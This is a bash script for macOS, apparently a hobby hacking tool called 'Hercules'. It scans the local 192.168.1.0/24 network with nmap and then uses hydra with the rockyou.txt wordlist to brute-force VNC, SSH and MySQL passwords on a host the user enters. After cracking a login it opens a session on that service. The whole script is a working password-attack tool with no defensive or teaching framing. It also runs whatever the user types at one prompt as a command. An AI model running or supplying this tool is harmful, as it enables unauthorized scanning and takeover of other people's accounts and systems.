#!/bin/bash

#yes 
yes=("yes" "Yes" "YES")

# Root user
root=0

# Gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

if [[ "$OSTYPE" == "darwin"* ]]; then
    clear
    if [[ $EUID -ne $root ]]; then
        # Error message if not running as root
        echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
        exit
    else
        sudo rm -rf hydra.restore
        clear

        wget -q --spider http://google.com

        # If the user is connected to the internet, it works as normal
        if [[ $? -eq 0 ]]; then
            echo
        
        # Else, it notifies them that they are not connected to the internet and tells them to connect
        else
            # Error message if offline
            echo "ERROR:root:TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE." >> ERROR.LOG
            echo "TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE"
            #ask if they want to recover there password
            read -p "Do you want to crack your password (yes or no): " stillCrack

            if [[ "${yes[*]}" == *"$stillCrack"* ]]; then
                echo "Ok"
            else
                exit
            fi
        fi

        # clear the terminal
        clear

        #tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
        Hercules() {
            # The logo of the program
            figlet -f slant "Hercules"

            echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL': "
            read -p ">>> " service

            if [[ $service == "ALL" || $service == "all" ]]; then
                # Tells the user that it can take up to an hour to complete the scanning process
                echo "This can take up to 1 hour to complete."
                # Scan the entire network and display open ports
                sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt -A --open
                hydra -h
                echo "Put in hydra first to start the script."
                read -p ">>> " Hydra
                $Hydra
                exit
            else
                # Scan specific port
                sudo nmap -sS 192.168.1.1/24 -p $service --open
            fi
        }

        RunHackingCommand() {
            #break in the outputs of my code
            echo 
            #services to crack the network
            echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
            echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
            read -p "Input Username: " user
            read -p "Input Hostname: " host
        }

        RunHackingCommandWithVNC() {
            if [[ $service == 5900 || $service == "VNC" ]]; then
                # Checks if the user has put anything in the 'Input Username' function and the hostname function
                # If not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" || $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    RunHackingCommand
                # If the user inputs something in the 'Input Username' function and the hostname function,
                # it will continue as normal
                else
                    # Crack VNC password
                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                    echo "Loading VNC server..."
                    open vnc://$host
                    exit
                fi
            fi
        }

        RunHackingCommandWithSSH() {
            if [[ $service == 22 || $service == "ssh" ]]; then
                # Checks if the user has put anything in the 'Input Username' function and the hostname function
                # If not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    RunHackingCommand
                # If the user inputs something in the 'Input Username' function and the hostname function,
                # it will continue as normal
                else

                    # Crack SSH password
                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                    echo "Connecting to $user@$host"
                    sleep 3
                    ssh $user@$host
                fi
            fi
        }

        RunHackingCommandWithMySQL() {
            if [[ $service == 3306 || $service == "mysql" ]]; then
                # Checks if the user has put anything in the 'Input Username' function and the hostname function
                # If not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    RunHackingCommand
                # If the user inputs something in the 'Input Username' function and the hostname function,
                # it will continue as normal
                else
                    # Crack MySQL password
                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
                    echo "Loading MySQL server..."
                    sleep 3
                    mysql -u $user -p -A
                fi
            fi
        }
        
        Hercules # Calls the Hercules function

        RunHackingCommand # Calls the RunHackingCommand function

        RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

        RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function

        RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
    fi
else
    clear
    # Warning message for wrong OS
    echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
    echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
fi
